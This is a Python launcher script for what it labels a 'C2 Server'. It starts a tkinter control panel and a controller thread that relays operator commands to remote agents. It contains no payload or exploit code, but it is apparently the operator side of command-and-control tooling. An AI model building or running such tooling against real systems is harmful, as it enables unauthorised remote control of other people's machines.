import tkinter as tk
from queue import Queue
import threading

from server.gui import ControlPanelGUI
from server.controller import AppController

if __name__ == '__main__':
    gui_queue = Queue()
    controller_command_queue = Queue()

    controller = AppController(gui_queue)
    controller_thread = threading.Thread(target=controller.start, daemon=True)

    root = tk.Tk()
    gui = ControlPanelGUI(root, controller_command_queue, gui_queue)
    
    def process_controller_commands():
        try:
            while not controller_command_queue.empty():
                cmd_data = controller_command_queue.get_nowait()
                agent_id = cmd_data.get('agent_id')
                command = cmd_data.get('command')
                if agent_id and command:
                    controller.send_command_to_agent(agent_id, command)
                controller_command_queue.task_done()
        finally:
            root.after(100, process_controller_commands)

    try:
        print("--- Starting C2 Server ---")
        controller_thread.start()
        process_controller_commands()
        root.mainloop()
    except KeyboardInterrupt:
        print("\n[Main] Keyboard interrupt received.")
    finally:
        print("[Main] Shutting down controller...")
        controller.stop()
        print("--- C2 Server Terminated ---")